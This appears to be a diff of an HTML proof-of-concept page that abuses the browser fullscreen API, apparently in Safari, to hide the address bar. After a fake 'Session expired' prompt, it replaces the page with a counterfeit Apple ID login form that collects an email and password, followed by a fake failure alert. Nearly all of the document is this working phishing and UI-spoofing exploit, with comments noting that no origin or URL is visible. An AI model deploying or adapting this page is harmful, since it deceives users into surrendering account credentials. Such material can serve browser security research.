@@ -1,62 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Document Viewer</title>
+  <title>Verification Required</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body, html {
+    html, body {
       margin: 0;
-      padding: 0;
-      background: #fff;
-      font-family: sans-serif;
-    }
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
+      font-family: -apple-system, sans-serif;
       background: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      z-index: 9999;
     }
-    .fake-ui {
-      border: 1px solid #ccc;
-      padding: 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      text-align: center;
+    .center {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
     button {
-      margin-top: 20px;
-      padding: 10px 20px;
+      padding: 12px 24px;
       font-size: 16px;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 5px;
     }
   </style>
 </head>
 <body>
-
-<div class="overlay" id="overlay">
-  <div class="fake-ui">
-    <h2>🔒 Secure Preview</h2>
-    <p>This document requires fullscreen permission.</p>
-    <button onclick="triggerSpoof()">Allow Fullscreen</button>
+  <div class="center">
+    <h2>Session expired</h2>
+    <p>You must re-login to continue.</p>
+    <button onclick="exploit()">Continue</button>
   </div>
-</div>
 
-<script>
-function triggerSpoof() {
-  document.documentElement.requestFullscreen().then(() => {
-    setTimeout(() => {
-      // Simulate native alert without any context shown in Safari
-      alert("Your session has expired. Please login again to continue.");
-    }, 600);
-  });
-}
-</script>
+  <script>
+    function exploit() {
+      document.documentElement.requestFullscreen().then(() => {
+        // Rebuild UI spoof — no origin visible
+        document.body.innerHTML = `
+          <div class="center">
+            <h2>🔒 Apple ID Login Required</h2>
+            <input placeholder="Email / Apple ID"><br><br>
+            <input type="password" placeholder="Password"><br><br>
+            <button onclick="fakeAlert()">Login</button>
+          </div>
+        `;
+      });
+    }
 
+    function fakeAlert() {
+      alert("🔐 Login failed. Please try again.");
+      // At this point: fullscreen, spoofed context, no visible URL
+    }
+  </script>
 </body>
 </html>
